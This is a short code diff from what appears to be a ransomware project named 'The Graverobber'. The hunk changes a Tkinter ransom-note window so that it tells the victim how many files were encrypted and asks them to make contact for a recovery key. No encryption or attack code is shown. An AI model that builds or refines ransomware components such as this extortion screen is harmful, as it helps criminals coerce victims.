@@ -209,7 +209,7 @@ def button_clicked(entry):
 # ========================================================================= #
 window = Tk()
 window.title("The Graverobber - DO NOT CLOSE THIS WINDOW!")
-phrase_a = Label(window, text="You have been visited by the Graverobber. Some of your files are now encrypted.")
+phrase_a = Label(window, text="You have been visited by the Graverobber. {0} file(s) are now encrypted.".format(len(tool.files_found)))
 phrase_a.grid(column=0, row=0)
 
 phrase_b = Label(window, text="Get in touch with us to get your recovery key.")
